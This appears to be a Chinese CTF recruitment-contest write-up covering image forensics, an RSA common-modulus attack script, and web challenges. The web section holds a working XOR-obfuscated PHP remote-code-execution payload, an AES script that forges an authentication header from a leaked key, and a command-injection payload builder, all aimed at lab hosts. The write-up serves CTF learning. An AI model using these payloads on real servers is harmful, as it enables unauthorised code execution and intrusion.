+++
date = '2025-12-06T17:32:48+08:00'
title = '2025 纳新赛 WriteUp'
showToc = true
tags = ['ctf', 'write up']
+++

## Misc

### Crossfire

用 010 Editor 打开发现是个 PNG，但是缺少文件头，补上后打开，发现这张图的大小不对，用随波逐流工具修复一下宽高，就能看到 flag 了。

### basic

用 010 Editor 打开，发现上部分是 PNG，下部分是 ZIP，中间是一段 base64，转码过后发现是密码，用这个密码解压 ZIP 就能看到 flag 了。

## Pwn

### Test your NetCat

`ls` 一下，发现没有文件，`ls -a` 发现有文件，且有 `flag`，`cat flag` 发现是假 flag，只能看看 `attachment` 这个文件了，结果没权限，最后试了下 `cat *` 发现出现 flag 了。

## Crypto

### RSA_Signin

RSA 共模攻击，运行脚本：

```python
import math
from functools import reduce

def extended_gcd(a, b):
    """
    扩展欧几里得算法：求解 ax + by = gcd(a, b)
    返回 (gcd, x, y)
    """
    if a == 0:
        return (b, 0, 1)
    else:
        gcd, x, y = extended_gcd(b % a, a)
        return (gcd, y - (b // a) * x, x)

def mod_inverse(a, mod):
    """
    计算a在mod下的逆元（要求a和mod互质）
    利用扩展欧几里得算法实现
    """
    gcd, x, y = extended_gcd(a, mod)
    if gcd != 1:
        raise Exception('逆元不存在（a与mod不互质）')
    else:
        return x % mod

def rsa_common_mod_attack(N, e1, c1, e2, c2):
    """
    RSA共模攻击核心函数
    输入：同一模数N、两组公钥(e1,e2)、两组密文(c1,c2)
    输出：明文m（整数形式）
    """
    # 步骤1：验证e1和e2互质（攻击前提）
    gcd_e, x, y = extended_gcd(e1, e2)
    if gcd_e != 1:
        raise Exception('e1和e2不互质，无法进行共模攻击')
    print(f"e1和e2互质（gcd={gcd_e}），满足攻击条件")
    print(f"贝祖等式系数：x={x}, y={y}（满足 e1*x + e2*y = 1）")
    
    # 步骤2：处理负系数（将负指数转换为正逆元）
    if x < 0:
        c1_inv = mod_inverse(c1, N)  # c1^(-1) mod N
        x_abs = -x
        term1 = pow(c1_inv, x_abs, N)  # c1^x mod N = (c1^(-1))^|x| mod N
    else:
        term1 = pow(c1, x, N)  # 正指数直接计算
    
    if y < 0:
        c2_inv = mod_inverse(c2, N)  # c2^(-1) mod N
        y_abs = -y
        term2 = pow(c2_inv, y_abs, N)  # c2^y mod N = (c2^(-1))^|y| mod N
    else:
        term2 = pow(c2, y, N)  # 正指数直接计算
    
    # 步骤3：计算明文 m = (term1 * term2) mod N
    m = (term1 * term2) % N
    return m

def int_to_ascii(m):
    """
    将整数明文转换为ASCII字符串（处理CTF常见flag格式）
    """
    # 整数转换为字节流（大端序）
    byte_data = m.to_bytes((m.bit_length() + 7) // 8, byteorder='big')
    try:
        return byte_data.decode('ascii')
    except UnicodeDecodeError:
        return "明文非ASCII格式，返回整数形式：" + str(m)

if __name__ == "__main__":
    # -------------------------- 已知参数（可直接替换为其他共模攻击场景）--------------------------
    N = 162178605357818616394571566923155907889899677780239882906511996614607940884142045197452389471499799373787832649318837814454679970724845203557871078001956378966434166323827984964942729898095347038272003371167123553368531662277059263517900162297903110415768403265100411543878859321181606008503516896600638590699
    e1 = 35422
    c1 = 153249315480380808558746807096025628082875635601515291525075274335055878390662930254941118045696231628008256877302589689883059616503108946971165183674522403835250738176157466145855833767128209866527507862726083268576304163200171600023472544755768741118904892489037291247455823396160705615280802805803254323033
    e2 = 1033
    c2 = 5823189490163315770684717059899864988806118565674660089157163486577056500243194221873916232616081138765317598078910078375360361118674333149663483360677725162911935082290640547407140413703664960164356579153623498735889314476063673352676918268911309402784919521792079943937126634436658784515914270266106683548
    
    # -------------------------- 执行攻击 --------------------------
    print("开始RSA共模攻击...")
    try:
        # 执行攻击得到整数明文
        m_int = rsa_common_mod_attack(N, e1, c1, e2, c2)
        # 转换为可读字符串
        m_str = int_to_ascii(m_int)
        
        # 输出结果
        print("\n" + "=" * 50)
        print("攻击成功！")
        print(f"整数明文：{m_int}")
        print(f"可读明文：{m_str}")
        print("="*50)
    except Exception as e:
        print(f"攻击失败：{str(e)}")
```

### Sign_in

出题人不喜欢 `0`，把 `0` 全部去掉，在网上搜“颜文字加密解密”发现了 AAencode，用这个解密即可拿到 flag。

## Web

### EzRce

这题要绕过字母数字，用这个异或转换的 payload 即可：

```http
POST /?shell=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]); HTTP/1.1
Host: 172.30.211.91:33670
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

_=system('cat%20%2Fflag')
```

这段 payload 的意义是执行 `$_POST[_]` 的内容。

### 狠狠注

看一下源码，看到页面会检查请求头里的 `X-Signature` 的内容是否为 `Secret_key` 的 base64 编码，所以把请求头的 `X-Signature` 改成 `Secret_key` 的 base64 编码，发现 `index.php` 没啥用，就去 `execute.php`，发现需要正确的 `X-Source`，运行这样的代码得到 `X-Source`：

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import random

# -------------------------- 固定参数（必须和后端一致）--------------------------
SECRET_KEY = b"Fidy66rEB65mnE5UbPyEsgMxmmhdNebU"  # 后端 Secret_key，转字节类型
PLAIN_TEXT = b"index.php"  # 解密后必须的值，转字节类型
AES_MODE = algorithms.AES(SECRET_KEY)
BLOCK_SIZE = 16  # AES-256-CBC 要求 IV 长度=16字节


def base64url_encode(data: bytes) -> str:
    """
    实现 base64url 编码（和后端 base64url_decode 反向对应）
    规则：1. base64编码 → 2. 替换 '+' 为 '-', '/' 为 '_' → 3. 去除末尾 padding（=）
    """
    # 标准 base64 编码
    base64_str = base64.b64encode(data).decode("utf-8")
    # 替换字符 +/ 为 -_
    base64url_str = base64_str.replace("+", "-").replace("/", "_")
    # 去除末尾的 padding（=）
    return base64url_str.rstrip("=")


def generate_valid_x_source() -> str:
    """生成合法的 X-Source 值"""
    # 1. 生成 16 字节随机 IV（和后端解密时提取的 IV 对应）
    iv = bytes(bytearray(random.getrandbits(8) for _ in range(BLOCK_SIZE)))  # 16字节随机数

    # 2. AES-256-CBC 加密（PKCS7 填充，与后端 openssl_encrypt 兼容）
    # 初始化加密器：CBC 模式 + 随机 IV
    cipher = Cipher(AES_MODE, modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # 3. 对明文进行 PKCS7 填充（后端默认使用 PKCS7 填充，必须对齐）
    # 填充逻辑：计算需要补充的字节数，填充值=补充的字节数
    pad_length = BLOCK_SIZE - (len(PLAIN_TEXT) % BLOCK_SIZE)
    padded_plaintext = PLAIN_TEXT + bytes([pad_length] * pad_length)

    # 4. 执行加密，得到密文（字节类型）
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()

    # 5. 拼接 IV + 密文（顺序不能反！后端会先取前16字节作为 IV）
    iv_ciphertext = iv + ciphertext

    # 6. 对拼接结果做 base64url 编码，得到最终 X-Source
    return base64url_encode(iv_ciphertext)

if __name__ == "__main__":
    # 生成 X-Source（单独使用）
    valid_x_source = generate_valid_x_source()
    print("合法的 X-Source：", valid_x_source)
```

得到 `X-Source` 后写到请求头里，分析接下来的代码，发现它会读取 `php://input` 的内容写到 `command` 里并会执行，用下面的代码得到正确的 payload，用 Postman 上传的时候改成 binary，上传 `payload.bin` 这个文件，即可拿到 flag。

```python
type_byte = b'A'  # 1字节类型
length_bytes = b'\x00\x09'
command = b'cat /flag'

payload = type_byte + length_bytes + command

with open('payload.bin', 'wb') as f:
    f.write(payload)
```

## Reverse

### babyre

用 IDA 打开直接就看到 `cmp` 函数里的 `we1come_to_ctf`，把这个转换成 md5 再包上 `flag{}` 发现不行，试了很多次发现要把 `flag{we1come_to_ctf}` 本身转成 md5 再包上 `flag{}`。

### signin

迷宫题，路径都已经给出来了，根本不需要打开 IDA，把路径包上 `flag{}` 再转成 md5 再包上 `flag{}` 就行了。